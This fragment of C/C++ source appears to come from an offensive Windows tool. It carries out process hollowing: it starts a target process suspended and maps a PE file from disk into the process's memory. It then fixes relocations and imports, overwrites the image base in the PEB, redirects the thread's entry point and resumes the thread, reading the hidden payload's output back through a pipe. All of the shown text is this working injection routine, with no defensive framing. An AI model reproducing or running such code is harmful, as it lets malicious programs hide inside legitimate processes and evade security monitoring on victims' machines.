	LPVOID peToInjectContent = NULL;
	DWORD peSize = 0;

	HANDLE hStdOut = nullptr;

	if (!loadPEFromDisk(peInject, peToInjectContent, &peSize))
		exit(1);


	if (!launchSusprendedProcess((LPSTR)target, pi, args, hStdOut))
		exit(1);

	if (!retrieveNtHeaders(peInjectNtHeaders, peToInjectContent))
		exit(1);

	LPVOID allocAddrOnTarget = NULL;
	allocAddrOnTarget = VirtualAllocEx(pi->hProcess, NULL, peInjectNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	DWORD64 DeltaImageBase = (DWORD64)allocAddrOnTarget - peInjectNtHeaders->OptionalHeader.ImageBase;

	if (allocAddrOnTarget == NULL)
	{
		_dbg("[-] ERROR: Failed to allocate memory on target process\r\n");
		exit(1);
	}

	_dbg("[+] Memory allocate at : 0x%p\n", allocAddrOnTarget);

	IMAGE_DATA_DIRECTORY relocationTable = peInjectNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	PIMAGE_SECTION_HEADER peToInjectRelocSection = NULL;

	DWORD offsetRdata = 0;

	if (!copyPEinTargetProcess(pi->hProcess, allocAddrOnTarget, peToInjectContent, peInjectNtHeaders, peToInjectRelocSection, &offsetRdata))
		exit(1);

	if (!fixRelocTable(pi->hProcess, peToInjectRelocSection, allocAddrOnTarget, peToInjectContent, DeltaImageBase, relocationTable))
		exit(1);

	if (!loadImportTableLibs(peToInjectContent, peInjectNtHeaders, pi, allocAddrOnTarget, offsetRdata))
		exit(1);

	if (!loadDelayedImportTableLibs(peToInjectContent, peInjectNtHeaders, pi, allocAddrOnTarget, offsetRdata))
		exit(1);

	HANDLE mod = getSnapShotProcess(pi->dwProcessId);

	if (!fixImports(peToInjectContent, peInjectNtHeaders, pi, allocAddrOnTarget, offsetRdata, mod))
		exit(1);

	if (!fixDelayedImports(peToInjectContent, peInjectNtHeaders, pi, allocAddrOnTarget, offsetRdata, mod))
		exit(1);

	CONTEXT CTX = {};
	CTX.ContextFlags = CONTEXT_FULL;

	const BOOL bGetContext = GetThreadContext(pi->hThread, &CTX);
	if (!bGetContext)
	{
		_dbg("[-] An error is occured when trying to get the thread context.\n");
		return FALSE;
	}

	const BOOL bWritePEB = WriteProcessMemory(pi->hProcess, (LPVOID)(CTX.Rdx + 0x10), &peInjectNtHeaders->OptionalHeader.ImageBase, sizeof(DWORD64), nullptr);
	if (!bWritePEB)
	{
		_dbg("[-] An error is occured when trying to write the image base in the PEB.\n");
		return FALSE;
	}

	CTX.Rcx = (DWORD64)allocAddrOnTarget + peInjectNtHeaders->OptionalHeader.AddressOfEntryPoint;

	const BOOL bSetContext = SetThreadContext(pi->hThread, &CTX);
	if (!bSetContext)
	{
		_dbg("[-] An error is occured when trying to set the thread context.\n");
		return FALSE;
	}

	ResumeThread(pi->hThread);
	PVOID commandOutput = nullptr;
	DWORD bytesSize = 0;
	while (WaitForSingleObject(pi->hThread, 100) != WAIT_OBJECT_0) {
		readPipe(hStdOut, &commandOutput, &bytesSize);
		if (bytesSize > 0)
		{
			printf("%s\r\n", commandOutput);
			DATA_FREE(commandOutput, bytesSize);
		}
	}

	// Reading output one last time to check we don't leave anything behind...
	readPipe(hStdOut, &commandOutput, &bytesSize);
	if (bytesSize > 0)
	{
		printf("%s\r\n", commandOutput);
	}


	return 0;
}
